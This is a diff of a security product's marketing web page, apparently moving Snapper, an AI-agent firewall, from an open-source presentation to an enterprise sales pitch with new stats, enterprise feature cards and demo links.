@@ -933,12 +1002,20 @@ footer a:hover { color: var(--accent); }
   <div class="container">
     <div class="stats-grid">
       <div class="stat-card">
-        <div class="number">15</div>
+        <div class="number">16</div>
         <div class="label">Rule types</div>
       </div>
       <div class="stat-card">
-        <div class="number">860</div>
+        <div class="number">950+</div>
         <div class="label">Tests (unit + E2E)</div>
+      </div>
+      <div class="stat-card">
+        <div class="number">7</div>
+        <div class="label">Kill chain detectors</div>
+      </div>
+      <div class="stat-card">
+        <div class="number">13</div>
+        <div class="label">Threat signal types</div>
       </div>
       <div class="stat-card">
         <div class="number">341+</div>
@@ -949,12 +1026,46 @@ footer a:hover { color: var(--accent); }
         <div class="label">PII detection patterns</div>
       </div>
       <div class="stat-card">
-        <div class="number">6</div>
-        <div class="label">Agents supported</div>
+        <div class="number">&lt;2ms</div>
+        <div class="label">Threat analysis latency</div>
       </div>
       <div class="stat-card">
-        <div class="number">50+</div>
-        <div class="label">CVEs mitigated</div>
+        <div class="number">40+</div>
+        <div class="label">Known MCP servers</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ENTERPRISE -->
+<section class="enterprise" id="enterprise">
+  <div class="container">
+    <h2>Enterprise-ready from day one</h2>
+    <p class="subtitle">Deploy on-prem or in your cloud. Full control over your data, your agents, and your compliance posture.</p>
+    <div class="enterprise-grid">
+      <div class="enterprise-card">
+        <h3>SSO & Identity</h3>
+        <p>SAML 2.0 and OIDC single sign-on. SCIM provisioning for automated user lifecycle. Role-based access control with admin, member, and viewer roles.</p>
+      </div>
+      <div class="enterprise-card">
+        <h3>Multi-Org Isolation</h3>
+        <p>Organization-scoped agents, rules, PII vaults, and audit trails. Full tenant isolation with per-org billing and quota enforcement.</p>
+      </div>
+      <div class="enterprise-card">
+        <h3>On-Prem Deployment</h3>
+        <p>Docker Compose deployment with PostgreSQL, Redis, and Celery. Runs in your VPC. No data leaves your infrastructure. Air-gapped operation supported.</p>
+      </div>
+      <div class="enterprise-card">
+        <h3>SIEM Integration</h3>
+        <p>CEF-formatted syslog events for every security decision. Native integration with Splunk, Microsoft Sentinel, IBM QRadar, and any CEF-compatible collector.</p>
+      </div>
+      <div class="enterprise-card">
+        <h3>Compliance & Audit</h3>
+        <p>Complete audit trail of every agent action, approval decision, and rule change. Structured JSON logs. SOC 2 and GDPR-friendly architecture with data residency control.</p>
+      </div>
+      <div class="enterprise-card">
+        <h3>Dedicated Support</h3>
+        <p>Enterprise customers get priority support, custom integration assistance, deployment guidance, and a dedicated technical account manager.</p>
       </div>
     </div>
   </div>
@@ -964,35 +1075,35 @@ footer a:hover { color: var(--accent); }
 <section class="security-trust" id="security-trust">
   <div class="container">
     <h2>Security &amp; trust</h2>
-    <p class="security-intro">Snapper is a security tool — so we hold ourselves to the same standard we enforce on agents. Here's how we protect the project and our users.</p>
+    <p class="security-intro">Snapper is a security product — so we hold ourselves to the same standard we enforce on agents.</p>
     <div class="trust-grid">
       <div class="trust-card">
         <div class="trust-icon">
           <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
         </div>
-        <h3>Vulnerability Disclosure</h3>
-        <p>Report security issues privately via <a href="https://github.com/jmckinley/snapper/security/advisories">GitHub Security Advisories</a>. We acknowledge reports within 72 hours and follow a 90-day coordinated disclosure timeline.</p>
-      </div>
-      <div class="trust-card">
-        <div class="trust-icon">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
-        </div>
-        <h3>No Security Guarantee</h3>
-        <p>Snapper enhances your security posture but does not guarantee complete protection. No security tool can. You are responsible for your own configuration, risk assessment, and compliance. See <a href="https://github.com/jmckinley/snapper/blob/main/TERMS.md">TERMS.md</a>.</p>
+        <h3>Fail-Closed by Default</h3>
+        <p>Every evaluation path defaults to deny. No rules configured? Deny. Rule engine error? Deny. Network timeout? Deny. This is non-negotiable — your agents never operate without policy enforcement.</p>
       </div>
       <div class="trust-card">
         <div class="trust-icon">
           <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
         </div>
-        <h3>Source Available, As-Is</h3>
-        <p>Snapper is provided "as is" without warranty of any kind under the <a href="https://polyformproject.org/licenses/noncommercial/1.0.0">PolyForm Noncommercial License</a>. Free for personal use, research, education, and nonprofits. Commercial use requires a separate license. Full terms in the <a href="https://github.com/jmckinley/snapper">repository</a>.</p>
+        <h3>Encryption at Rest</h3>
+        <p>PII vault uses AES-256-GCM with HKDF-derived keys. Vault tokens are 128-bit random with domain locking and 30-second TTL. Zero plaintext PII is stored anywhere in the system.</p>
+      </div>
+      <div class="trust-card">
+        <div class="trust-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+        </div>
+        <h3>Vulnerability Disclosure</h3>
+        <p>We maintain a responsible vulnerability disclosure program. Security issues are acknowledged within 72 hours with a 90-day coordinated disclosure timeline. Contact <a href="mailto:security@mckinleylabs.com">security@mckinleylabs.com</a>.</p>
       </div>
       <div class="trust-card">
         <div class="trust-icon">
           <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
         </div>
-        <h3>Contributor Verification</h3>
-        <p>All contributions require a Developer Certificate of Origin (DCO) sign-off, certifying that contributors have the right to submit their code and agree to the project's license terms.</p>
+        <h3>950+ Automated Tests</h3>
+        <p>Unit tests, integration tests, E2E Playwright tests, live API tests, and a dedicated threat simulator that validates all 13 signal types and 7 kill chains against a running instance. Every commit is tested.</p>
       </div>
     </div>
   </div>
@@ -1001,18 +1112,18 @@ footer a:hover { color: var(--accent); }
 <!-- CTA -->
 <section class="cta">
   <div class="container">
-    <h2>Get started in 5 minutes</h2>
-    <p>Docker, one command, and your agent is protected. Free for noncommercial use.</p>
-    <div class="cta-code">
-      <span class="cmd">git clone</span> https://github.com/jmckinley/snapper.git && <span class="cmd">cd</span> snapper && <span class="cmd">./setup.sh</span>
-    </div>
+    <h2>Protect your AI agents today</h2>
+    <p>Deploy Snapper in your infrastructure and get enterprise-grade agent security with full threat detection, PII protection, and human-in-the-loop governance.</p>
     <br>
     <div class="hero-actions" style="justify-content: center; opacity: 1;">
-      <a href="https://github.com/jmckinley/snapper" class="btn-primary">
-        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
-        View on GitHub
+      <a href="mailto:john@mckinleylabs.com" class="btn-primary">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+        Request a Demo
       </a>
-      <a href="https://github.com/jmckinley/snapper/blob/main/docs/GETTING_STARTED.md" class="btn-secondary">Read the docs</a>
+      <a href="https://app.snapperprotect.com/login" class="btn-secondary">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
+        Sign In to Dashboard
+      </a>
     </div>
   </div>
 </section>
@@ -1023,7 +1134,7 @@ footer a:hover { color: var(--accent); }
 <footer>
   <div class="container">
     <p style="margin-bottom: 6px;">&copy; 2026 McKinley Labs LLC &mdash; Snapper Agent Application Firewall</p>
-    <p><a href="https://polyformproject.org/licenses/noncommercial/1.0.0">PolyForm Noncommercial License</a> &middot; <a href="https://github.com/jmckinley/snapper">GitHub</a> &middot; <a href="https://github.com/jmckinley/snapper/issues">Issues</a> &middot; <a href="https://github.com/jmckinley/snapper/discussions">Discussions</a> &middot; <a href="https://github.com/jmckinley/snapper/security/advisories">Security</a> &middot; <a href="mailto:john@greatfallsventures.com">Contact</a> &middot; <a href="terms.html">Terms</a></p>
+    <p><a href="mailto:john@mckinleylabs.com">Contact Sales</a> &middot; <a href="mailto:security@mckinleylabs.com">Security</a> &middot; <a href="https://app.snapperprotect.com">Dashboard</a> &middot; <a href="terms.html">Terms</a></p>
   </div>
 </footer>
 
